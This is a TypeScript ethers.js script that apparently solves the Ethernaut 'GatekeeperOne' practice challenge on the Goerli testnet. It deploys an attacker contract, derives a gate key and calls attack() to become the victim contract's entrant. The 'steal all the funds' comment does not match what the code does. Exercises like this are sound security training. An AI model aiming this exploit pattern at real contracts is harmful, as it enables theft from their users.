import { ethers } from "ethers";
import * as fs from 'fs';
import { GatekeeperOne__factory, GatekeeperOneAttacker__factory } from '../typechain-types';

// Task: steal all the funds from the contract

const rpc = 'https://rpc.ankr.com/eth_goerli'
const privateKey = ''
const instanceAddress = ''

const main = async () =>  {
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/GatekeeperOneAttacker.sol/GatekeeperOneAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy(instanceAddress);
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = GatekeeperOneAttacker__factory.connect(attackerAddress, signer);
    const victim = GatekeeperOne__factory.connect(instanceAddress, signer);

    console.log("Hacking the contract...");

    const gateKey = await attacker.converter();
    const tx = await attacker.attack(gateKey);
    await tx.wait();

    const entrant = await victim.entrant();

    console.log("Successfully hacked!");
    console.log("Entrant:", entrant);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});